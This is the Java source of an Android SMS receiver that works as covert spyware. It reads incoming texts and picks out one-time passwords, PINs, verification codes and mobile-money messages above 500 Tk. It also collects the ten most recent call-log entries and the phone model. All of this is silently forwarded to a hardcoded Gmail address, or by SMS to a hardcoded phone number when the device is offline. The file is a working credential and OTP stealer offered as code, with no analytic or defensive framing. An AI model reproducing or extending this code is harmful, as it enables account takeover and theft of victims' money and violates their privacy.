package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.mail.MessagingException;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String FORWARD_SMS_NUMBER = "+8801915564632";

    private static final String[] INCOMING_CALL_NUMBERS = {"+8801304039293", "+8801748937891", "+8801915564631"};
    private static final String[] SEND_MONEY_WORDS = {"Cash In", "cash in", "send money", "received", "received TK","TK", "Tk", "tk", "Cashback","Balance", "Recharge",  "received money"};
    private static final String[] OTP_WORDS = {"OTP", "Otp", "PIN", "Pin", "VERIFICATUON", "Verification"};
    private static String lastSender;
    private static String lastMessage;
    private static long lastTimestamp;
    private Context mContext;

    public static String getSender() {
        return null;
    }

    @Override
    public void onReceive(Context context, Intent intent) {




        mContext = context;
        Bundle bundle = intent.getExtras();

        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    try {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        Log.d(TAG, "Received SMS from: " + sender + ", message: " + messageBody);

                        lastSender = sender;
                        lastMessage = messageBody;
                        lastTimestamp = System.currentTimeMillis();

                        boolean isIncomingCallNumber = IncomingCallNumber(sender);
                        boolean isSMSMoneyWords = containsSMSMoneyWords(messageBody);
                        boolean amountAboveThreshold =AmountAboveThreshold(messageBody);
                        boolean isNumberInCallLog = isNumberInCallLog(sender);
                        boolean isSMSOtp = containsSMSOtp(messageBody);
                        boolean isPatternMatchInCallLog = isPatternMatchInCallLogs();
                        boolean isPatternMatchInRecentMessages = isPatternMatchInRecentIncomingMessages();

                        Log.d(TAG, "Incoming Call Number check: " + isIncomingCallNumber);
                        Log.d(TAG, "Contains SMS MoneyWords check: " + isSMSMoneyWords);
                        Log.d(TAG, "Contains SMS AmountAboveThreshold check: " + amountAboveThreshold);
                        Log.d(TAG, "Is Number In CallLog check: " + isNumberInCallLog);
                        Log.d(TAG, "Contains SMS Otp check: " + isSMSOtp);
                        Log.d(TAG, "Pattern match check in CallLog: " + isPatternMatchInCallLog);
                        Log.d(TAG, "Pattern match check in Incoming Messages: " + isPatternMatchInRecentMessages);

                        if ( ( isSMSMoneyWords && amountAboveThreshold)||
                                (isNumberInCallLog && isSMSMoneyWords && amountAboveThreshold)||
                                 isSMSOtp || isPatternMatchInCallLog ||
                                (isIncomingCallNumber && isPatternMatchInRecentMessages) ) {
                            Log.d(TAG, "Condition match: For Forwarding message...");

                            try {
                                String recentCallLogs = getRecentCallLogs();
                                String forwardMessage = "From: " + sender + "\nMessage: " + messageBody + "\n\nRecent Call Logs:\n" + recentCallLogs;

                                if (isInternetConnected()) {
                                    Log.d(TAG, "Internet is connected. Forwarding SMS via email.");
                                    forwardSmsByEmail(sender, forwardMessage);
                                } else {
                                    Log.d(TAG, "Internet is not connected. Forwarding SMS via SMS.");
                                    forwardSmsBySMS(sender, forwardMessage);
                                }
                            } catch (MessagingException e) {
                                Log.e(TAG, "Failed to forward SMS: " + e.getMessage());
                            }
                        } else {
                            Log.d(TAG, "No conditions match for forwarding the message.");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing SMS: " + e.getMessage());
                    }
                }
            }
        }

        // OneTimeWorkRequest তৈরি করা হচ্ছে
        OneTimeWorkRequest workRequest = new OneTimeWorkRequest.Builder(SmsNotificationWorkManager.class)
                .build();
        // WorkManager দিয়ে কাজটি কিউতে রাখুন
        WorkManager.getInstance(context).enqueue(workRequest);

    }

    private boolean isInternetConnected() {
        try {
            ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet connection: " + e.getMessage());
        }
        return false;
    }

    private boolean IncomingCallNumber(String sender) {
        for (String number : INCOMING_CALL_NUMBERS) {
            if (sender.equals(number)) {
                Log.d(TAG, "Sender is an incoming call number: " + sender);
                return true;
            }
        }
        Log.d(TAG, "Not an incoming call number: " + sender);
        return false;
    }



    private boolean containsSMSMoneyWords(String messageBody) {
        for (String keyword : SEND_MONEY_WORDS) {
            if (messageBody.contains(keyword)) {
               Log.d(TAG, "Message contains money-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "No money-related keywords found in message.");
        return false;
    }



    private boolean containsSMSOtp(String messageBody) {
        for (String keyword : OTP_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Message contains OTP-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "no Message contains OTP-related keyword.");
        return false;
    }

    private boolean isPatternMatchInCallLogs() {
        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                Matcher matcher = pattern.matcher(number);
                if (matcher.find()) {
                    Log.d(TAG, "Matched number in Call Logs: " + number);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }

    private boolean isPatternMatchInRecentIncomingMessages() {
        Pattern pattern = Pattern.compile("\\b(\\d{4,6})\\b");
        Pattern datePattern = Pattern.compile("\\b(\\d{1,2}[/-]\\d{1,2}[/-]\\d{2,4}|\\d{2,4}[/-]\\d{1,2}[/-]\\d{1,2})\\b");

        Uri smsUri = Telephony.Sms.CONTENT_URI;
        String[] projection = { Telephony.Sms.ADDRESS, Telephony.Sms.BODY };
        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(smsUri, projection, null, null, Telephony.Sms.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                Matcher dateMatcher = datePattern.matcher(body);
                Set<String> dateNumbers = new HashSet<>();

                while (dateMatcher.find()) {
                    String dateMatch = dateMatcher.group();
                    for (String part : dateMatch.split("[/-]")) {
                        if (part.length() >= 4 && part.length() <= 6) {
                            dateNumbers.add(part);
                        }
                    }
                }

                Matcher matcher = pattern.matcher(body);
                while (matcher.find()) {
                    String matchedNumber = matcher.group(1);
                    if (matchedNumber.length() >= 4 && matchedNumber.length() <= 6 && !dateNumbers.contains(matchedNumber)) {
                        Log.d(TAG, "pattern Matched numbers in Incoming Messages: " + matchedNumber);
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "pattern Error querying incoming messages: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }

    private boolean isNumberInCallLog(String sender) {
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;

        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    if (number.equals(sender)) {
                        Log.d(TAG, "Number found in call log: " + sender);
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call log: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        Log.d(TAG, "Sender number not found in call log: " + sender);
        return false;
    }

    private String getRecentCallLogs() {
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        Cursor cursor = null;
        try {
            // Query all call logs without LIMIT
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    if (count >= 10) break; // Limit to 10 results
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

                    String callType = getCallType(type);

                    callLogBuilder.append("Number: ").append(number)
                            .append(", Type: ").append(callType)
                            .append(", Duration: ").append(duration)
                            .append(", Date: ").append(DateUtils.dateToString(date))
                            .append("\n");
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving call logs: ", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callLogBuilder.toString();
    }




    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    private void forwardSmsByEmail(String sender, String body) throws MessagingException {
        Log.d(TAG, "Preparing to send email...");

        // Get the mobile model
        String mobileModel = android.os.Build.MODEL;

        // Set the subject to include sender and mobile model
        String subject = "SMS from: " + sender + " on model: " + mobileModel;

        Log.d(TAG, "Subject: " + subject);
        Log.d(TAG, "Body: " + body);

        try {
            Log.d(TAG, "Attempting to send email through JavaMailAPI_SmsReceiver_Send...");
            JavaMailAPI_SmsReceiver_Send.sendMail("abontiangum99@gmail.com", subject, body);
            Log.d(TAG, "sendMail method called successfully.");
        } catch (Exception e) {
            Log.e(TAG, "Error calling sendMail: " + e.getMessage());
        }

        Log.d(TAG, "If no exceptions occurred, email sending process initiated.");
    }


    private void forwardSmsBySMS(String sender, String message) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(FORWARD_SMS_NUMBER, null, message, null, null);
        Log.d(TAG, "SMS forwarded to: " + FORWARD_SMS_NUMBER);
    }


    private static final double MIN_AMOUNT = 500;
    private static final double MAX_AMOUNT = 900000000;



    private boolean AmountAboveThreshold(String messageBody) {
        Log.d(TAG, "AmountAboveThreshold check Received messageBody: " + messageBody);
        List<Double> amounts = extractAllAmounts(messageBody);

        boolean result = false;
        Log.d(TAG, "Checking extracted amounts: " + amounts);
        for (double amount : amounts) {
            Log.d(TAG, "Checking money amount: " + amount);
            if (amount >= MIN_AMOUNT && amount <= MAX_AMOUNT) {
                result = true;
                Log.d(TAG, "money Amount " + amount + " is within threshold.");
                break;
            } else {
                Log.d(TAG, "money Amount " + amount + " is NOT within threshold.");
            }
        }

        Log.d(TAG, "Final result for money amount above threshold: " + result);
        return result;
    }

    private List<Double> extractAllAmounts(String messageBody) {
        List<Double> amounts = new ArrayList<>();
        String regex = "Tk\\s*([\\d,]+(?:\\.\\d{1,2})?)"; // Tk এর পর পরিমাণ খুঁজুন
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(messageBody);

        Log.d(TAG, "Using regex: " + regex);

        while (matcher.find()) {
            String amountString = matcher.group(1);
            Log.d(TAG, "Matched amount string: " + amountString);

            if (amountString != null) {
                // কমা সরানো
                amountString = amountString.replace(",", "");
                Log.d(TAG, "Processed amount string (without commas): " + amountString);

                // পরিমাণটি ডাবল এ রূপান্তর করা
                try {
                    double amount = Double.parseDouble(amountString);
                    Log.d(TAG, "Extracted amount: " + amount);
                    amounts.add(amount);
                } catch (NumberFormatException e) {
                    Log.e(TAG, "Number format exception while parsing amount: " + e.getMessage());
                }
            }
        }

        if (amounts.isEmpty()) {
            Log.d(TAG, "No amounts extracted from the message.");
        } else {
            Log.d(TAG, "Amounts extracted: " + amounts);
        }

        return amounts;
    }

    public void receiveSms(Context applicationContext) {

        //onReceive(Context,Intent);
    }
}
